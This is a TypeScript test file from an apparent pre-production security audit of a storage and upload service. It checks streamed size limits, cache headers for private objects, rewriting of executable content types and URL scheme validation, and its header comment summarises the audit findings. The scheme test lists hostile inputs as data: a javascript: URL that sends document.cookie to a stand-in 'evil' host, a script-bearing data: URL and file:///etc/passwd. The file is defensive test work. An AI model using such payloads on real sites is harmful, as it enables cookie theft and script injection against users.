/**
 * Phase 10 of the 2026-09 pre-prod audit — the storage / upload cluster.
 *
 * Eight findings, and all but one are the same sentence: *a limit was computed
 * and then not read, or was read off a number the other end chose.*
 *
 *  · **`files.size` was 0 for every S3 multipart upload.**
 *    `s3FetchStorage.completeMultipart` returned `size: 0` literally, and
 *    `registerFile` writes what it is given. So anything above a client's
 *    multipart threshold (aws-cli 8 MB, rclone 5 MB, restic, mc, every TUS
 *    client) recorded ZERO bytes — `assertStorageWithinLimit` sums that column,
 *    so a workspace on a hard cap stored unlimited data by always going
 *    multipart, while the file browser, the usage gauges and anything billed
 *    off them agreed it had stored nothing.
 *
 *  · **`minPartBytes` and `partMax` were computed and never read.** S3 and R2
 *    both reject an under-5-MiB non-final part at COMPLETE, not at upload, so a
 *    TUS client chunking at 1 MB transferred a whole file — every PATCH
 *    answering 204 with an advancing offset — and then lost all of it to
 *    `EntityTooSmall`. Separately, `parts` is a JSON column rewritten in full on
 *    every PATCH, so N chunks cost O(N²) bytes of database writes and nothing
 *    bounded N.
 *
 *  · **Every byte ceiling was a `content-length` check**, and `content-length`
 *    belongs to the sender. `PUT /api/storage/:key` had no ceiling at all and
 *    the fs adapter buffered the whole body in memory; `/from-url` fetches a URL
 *    the CALLER chose, so the header capping it was the attacker's own.
 *
 *  · **A private object's transform said `public, max-age=31536000,
 *    immutable`.** `_sign` clamps a token to 24 hours precisely so a link stops
 *    working; add `&width=800` and every cache between here and the recipient
 *    was told to keep the bytes for a year.
 *
 *  · **`updateS3Credential` accepted a prefix `createS3Credential` refuses.**
 *
 * Guards verified by breaking them — see [[verify-a-guard-by-breaking-it]].
 */
import { describe, expect, test } from "bun:test";
import { AppError } from "@backlex/core";
import { fsStorage } from "../src/server/adapters/storage.fs";
import {
  assertDeclaredLengthWithin,
  limitStream,
} from "../src/server/services/storage/limit-stream";
import { transformCacheHeaders } from "../src/server/services/storage/transforms";
import {
  baseContentType,
  safeServeContentType,
  safeServeHeaders,
} from "../src/server/services/storage/content-type";
import { httpUrl } from "../src/server/lib/openapi";
import { mkdtempSync, statSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

// ---------------------------------------------------------------------------
// Measured bytes, not declared ones
// ---------------------------------------------------------------------------

const streamOf = (chunks: number[]): ReadableStream<Uint8Array> =>
  new ReadableStream({
    start(controller) {
      for (const n of chunks) controller.enqueue(new Uint8Array(n));
      controller.close();
    },
  });

const drain = async (s: ReadableStream<Uint8Array>): Promise<number> => {
  let total = 0;
  const reader = s.getReader();
  for (;;) {
    const { done, value } = await reader.read();
    if (done) break;
    total += value.byteLength;
  }
  return total;
};

describe("faz10: a body is capped by what it SENDS", () => {
  test("a stream under the cap passes through untouched", () => {
    expect(drain(limitStream(streamOf([100, 200, 300]), 1000))).resolves.toBe(600);
  });

  test("a stream over the cap errors mid-flight — the excess is never buffered", async () => {
    // The point of erroring in the transform rather than counting afterwards:
    // an fs `put` piping this to disk aborts instead of writing 4 GB.
    await expect(drain(limitStream(streamOf([600, 600]), 1000))).rejects.toThrow(/limit/);
  });

  test("a chunked body — no content-length at all — is still bounded", async () => {
    // The whole finding. `assertDeclaredLengthWithin` sees nothing and allows
    // it; the stream is what holds.
    expect(() => assertDeclaredLengthWithin(null, 1000)).not.toThrow();
    await expect(drain(limitStream(streamOf([2000]), 1000))).rejects.toThrow();
  });

  test("an over-declared content-length is refused before a byte is read", () => {
    expect(() => assertDeclaredLengthWithin("2000", 1000)).toThrow(/2000/);
    expect(() => assertDeclaredLengthWithin("999", 1000)).not.toThrow();
    // A lie is not caught here, which is exactly why both checks exist.
    expect(() => assertDeclaredLengthWithin("1", 1000)).not.toThrow();
  });

  test("the refusal is a 422, not a 500", () => {
    try {
      assertDeclaredLengthWithin("2000", 1000);
      throw new Error("should have thrown");
    } catch (e) {
      expect(e).toBeInstanceOf(AppError);
      expect((e as AppError).code).toBe("VALIDATION");
    }
  });
});

describe("faz10: the fs adapter streams to disk", () => {
  test("a ReadableStream body round-trips", async () => {
    const root = mkdtempSync(join(tmpdir(), "faz10-fs-"));
    const storage = fsStorage(root);
    const stored = await storage.put({ key: "a/b.bin", body: streamOf([1024, 2048]) });
    expect(stored.size).toBe(3072);
    const back = await storage.get("a/b.bin");
    expect(back).not.toBeNull();
    expect((await new Response(back!.body).arrayBuffer()).byteLength).toBe(3072);
  });

  test("…and bytes reach DISK before the stream closes", async () => {
    // The finding, made observable. A round-trip assertion passes either way —
    // buffering produces the same file — so it does not distinguish
    // `pipeline(Readable.fromWeb(...))` from `Buffer.from(await
    // response.arrayBuffer())`, and a first pass of this spec did not: the
    // break survived. What separates them is WHEN: streaming writes the first
    // chunk while the source is still open, buffering writes nothing until it
    // closes. So the source below hands over one chunk and then holds the
    // stream open until the file is on disk.
    const root = mkdtempSync(join(tmpdir(), "faz10-fs-stream-"));
    const storage = fsStorage(root);
    const target = join(root, "big.bin");

    let release!: () => void;
    const gate = new Promise<void>((r) => {
      release = r;
    });
    let handedOver = false;
    const body = new ReadableStream<Uint8Array>({
      async pull(controller) {
        if (!handedOver) {
          handedOver = true;
          controller.enqueue(new Uint8Array(64 * 1024));
          return;
        }
        // Second pull: block until the assertion below has seen the bytes land.
        await gate;
        controller.close();
      },
    });

    const put = storage.put({ key: "big.bin", body });

    // Poll for the first chunk to appear. Bounded, so a buffering
    // implementation fails here rather than hanging the suite.
    let landed = 0;
    for (let i = 0; i < 200 && landed === 0; i++) {
      await new Promise((r) => setTimeout(r, 10));
      try {
        landed = statSync(target).size;
      } catch {
        /* not created yet */
      }
    }
    release();
    await put;

    expect(landed).toBeGreaterThan(0);
    expect(statSync(target).size).toBe(64 * 1024);
  });

  test("…and the non-stream shapes still work", async () => {
    const root = mkdtempSync(join(tmpdir(), "faz10-fs2-"));
    const storage = fsStorage(root);
    expect((await storage.put({ key: "s.txt", body: "hello" })).size).toBe(5);
    expect((await storage.put({ key: "u.bin", body: new Uint8Array(9) })).size).toBe(9);
  });

  test("the fs adapter declares NO multipart minimum", () => {
    // It appends every part to one file. Enforcing S3's 5 MiB here would refuse
    // uploads that work perfectly — the number is a property of the BACKEND.
    expect(fsStorage(mkdtempSync(join(tmpdir(), "faz10-fs3-"))).minPartBytes).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// Cache directives follow what was proved
// ---------------------------------------------------------------------------

describe("faz10: a private object's transform is not cached publicly", () => {
  test("private → private, and briefly", () => {
    const h = transformCacheHeaders("private", false);
    expect(h["cache-control"]).toContain("private");
    expect(h["cache-control"]).not.toContain("immutable");
    expect(h["cache-control"]).not.toContain("31536000");
  });

  test("public via the token path is still not shareable", () => {
    // The token proved access for ONE client, not for every cache between here
    // and them — and the token expires while `immutable` does not.
    expect(transformCacheHeaders("public", true)["cache-control"]).toContain("private");
  });

  test("a genuinely public object keeps the aggressive policy", () => {
    // A cap that refuses everything is a different bug: transforms ARE
    // content-addressed by their query, so public bytes never change under a URL.
    const h = transformCacheHeaders("public", false);
    expect(h["cache-control"]).toBe("public, max-age=31536000, immutable");
  });

  test("an unknown ACL fails closed", () => {
    expect(transformCacheHeaders(null, false)["cache-control"]).toContain("private");
    expect(transformCacheHeaders(undefined, false)["cache-control"]).toContain("private");
  });
});

// ---------------------------------------------------------------------------
// Uploaded bytes cannot execute on this origin
// ---------------------------------------------------------------------------

describe("faz10: a stored object is never served as an executable subresource", () => {
  test("the JavaScript family is rewritten to octet-stream", () => {
    // `sandbox` and `content-disposition` govern a response as a DOCUMENT;
    // neither restricts it as a subresource, and `nosniff` is SATISFIED when
    // the type genuinely is JavaScript. So `<script src="/api/storage/x.js">`
    // injected on the admin origin ran under `script-src 'self'`.
    for (const ct of [
      "text/javascript",
      "application/javascript",
      "text/javascript; charset=utf-8",
      "APPLICATION/JAVASCRIPT",
      "application/wasm",
      "application/ecmascript",
    ]) {
      expect(safeServeContentType(ct)).toBe("application/octet-stream");
    }
  });

  test("ordinary types are echoed back as stored", () => {
    for (const ct of ["image/png", "application/pdf", "text/plain", "video/mp4"]) {
      expect(safeServeContentType(ct)).toBe(ct);
    }
  });

  test("a missing type is octet-stream, not empty", () => {
    expect(safeServeContentType(null)).toBe("application/octet-stream");
    expect(safeServeContentType("")).toBe("application/octet-stream");
  });

  test("the document family still gets sandbox + attachment", () => {
    // Unchanged — asserted so the new set cannot be introduced by weakening the
    // old one.
    const h = safeServeHeaders("text/html");
    expect(h["content-security-policy"]).toContain("sandbox");
    expect(h["content-disposition"]).toBe("attachment");
    expect(h["x-content-type-options"]).toBe("nosniff");
  });

  test("parameters and case cannot dodge either set", () => {
    expect(baseContentType("TEXT/HTML ;charset=utf-8")).toBe("text/html");
    expect(safeServeHeaders("TEXT/HTML ;x=1")["content-disposition"]).toBe("attachment");
  });
});

// ---------------------------------------------------------------------------
// A URL that will be fetched or rendered
// ---------------------------------------------------------------------------

describe("faz10: httpUrl refuses the schemes `z.string().url()` admits", () => {
  const schema = httpUrl();

  test("the executable schemes are refused", () => {
    for (const v of [
      "javascript:fetch('https://evil/?'+document.cookie)",
      "data:text/html,<script>alert(1)</script>",
      "vbscript:msgbox(1)",
      "file:///etc/passwd",
    ]) {
      expect(schema.safeParse(v).success).toBe(false);
    }
  });

  test("http and https still pass", () => {
    expect(schema.safeParse("https://example.com/ok").success).toBe(true);
    expect(schema.safeParse("http://example.com/ok").success).toBe(true);
  });

  test("the length bound still applies when one is given", () => {
    // `.refine()` returns a ZodEffects off which `.max()` no longer chains,
    // which is why the bound is an argument. If that broke, a 2000-char cap
    // would silently stop existing.
    const bounded = httpUrl(30);
    expect(bounded.safeParse("https://example.com/ok").success).toBe(true);
    expect(bounded.safeParse(`https://example.com/${"x".repeat(50)}`).success).toBe(false);
  });

  test("`.optional()` and `.nullish()` still chain", () => {
    expect(httpUrl().optional().safeParse(undefined).success).toBe(true);
    expect(httpUrl(100).nullish().safeParse(null).success).toBe(true);
  });
});
